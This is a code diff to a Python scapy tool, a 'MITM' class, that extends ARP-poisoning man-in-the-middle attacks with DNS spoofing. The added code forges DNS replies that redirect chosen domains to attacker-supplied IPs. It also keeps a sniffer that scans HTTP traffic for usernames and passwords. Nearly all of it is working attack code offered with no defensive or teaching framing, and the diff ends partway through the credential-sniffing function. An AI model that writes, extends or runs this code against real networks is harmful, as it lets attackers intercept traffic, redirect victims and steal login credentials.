@@ -1,14 +1,16 @@
 import logging
 import threading
 import time
-from scapy.all import ARP, Ether, IP, sendp, srp, sniff, Raw
+from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, TCP, UDP, sendp, srp, sniff, Raw
 
 class MITM:
     """
-    A class to handle Man-in-the-Middle attacks using ARP poisoning.
+    A class to handle Man-in-the-Middle attacks using ARP poisoning and DNS spoofing.
     """
     def __init__(self):
         self.poisoning = False
+        self.dns_spoofing = False
+        self.spoof_rules = {}
         self.poison_thread = None
         self.sniffer_thread = None
 
@@ -26,16 +28,12 @@ class MITM:
 
     def start_arp_poisoning(self, target_ip, gateway_ip):
         """
-        Starts the ARP poisoning attack and the credential sniffer.
+        Starts the ARP poisoning attack.
         """
         self.poisoning = True
         self.poison_thread = threading.Thread(target=self._arp_poison, args=(target_ip, gateway_ip))
-        self.sniffer_thread = threading.Thread(target=self._packet_sniffer)
-
         self.poison_thread.start()
-        self.sniffer_thread.start()
-
-        logging.info(f"ARP poisoning and credential sniffing started between {target_ip} and {gateway_ip}")
+        logging.info(f"ARP poisoning started between {target_ip} and {gateway_ip}")
 
     def stop_arp_poisoning(self, target_ip, gateway_ip):
         """
@@ -44,11 +42,28 @@ class MITM:
         self.poisoning = False
         if self.poison_thread:
             self.poison_thread.join()
-        if self.sniffer_thread:
-            self.sniffer_thread.join()
 
         self._restore_network(target_ip, gateway_ip)
         logging.info("ARP poisoning stopped and network restored.")
+
+    def start_dns_spoof(self, rules):
+        """
+        Starts the DNS spoofing attack and the packet sniffer.
+        """
+        self.dns_spoofing = True
+        self.spoof_rules = rules
+        self.sniffer_thread = threading.Thread(target=self._packet_sniffer)
+        self.sniffer_thread.start()
+        logging.info(f"DNS spoofing started with the following rules: {rules}")
+
+    def stop_dns_spoof(self):
+        """
+        Stops the DNS spoofing attack.
+        """
+        self.dns_spoofing = False
+        if self.sniffer_thread:
+            self.sniffer_thread.join()
+        logging.info("DNS spoofing stopped.")
 
     def _arp_poison(self, target_ip, gateway_ip):
         """
@@ -69,21 +84,41 @@ class MITM:
 
     def _packet_sniffer(self):
         """
-        Sniffs for packets and processes them to find credentials.
-        This now loops with a timeout to allow for graceful shutdown.
+        Sniffs for packets and processes them to find credentials or spoof DNS.
         """
         logging.info("Packet sniffer started.")
-        while self.poisoning:
-            sniff(filter="tcp port 80", prn=self._process_packet, store=0, timeout=1)
+        while self.poisoning or self.dns_spoofing:
+            sniff(filter="udp port 53 or tcp port 80", prn=self._process_packet, store=0, timeout=1)
         logging.info("Packet sniffer stopped.")
 
     def _process_packet(self, packet):
         """
         Callback function for the packet sniffer.
         """
-        if not packet.haslayer(IP) or not packet.haslayer(Raw):
-            return
+        if self.dns_spoofing and packet.haslayer(DNSQR):
+            self._dns_spoof(packet)
 
+        if packet.haslayer(IP) and packet.haslayer(Raw):
+            self._credential_sniffer(packet)
+
+    def _dns_spoof(self, packet):
+        """
+        Handles DNS spoofing.
+        """
+        qname = packet[DNSQR].qname.decode()
+        if qname in self.spoof_rules:
+            spoofed_ip = self.spoof_rules[qname]
+            response = Ether(src=packet[Ether].dst, dst=packet[Ether].src) / \
+                       IP(src=packet[IP].dst, dst=packet[IP].src) / \
+                       UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
+                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=qname, ttl=10, rdata=spoofed_ip))
+            sendp(response, verbose=False)
+            logging.info(f"Spoofed DNS response for {qname} -> {spoofed_ip}")
+
+    def _credential_sniffer(self, packet):
+        """
+        Processes packets to find credentials.
+        """
         try:
             load = packet[Raw].load.decode('utf-8', errors='ignore').lower()
             keywords = ['username', 'password', 'user', 'pass', 'login', 'email']
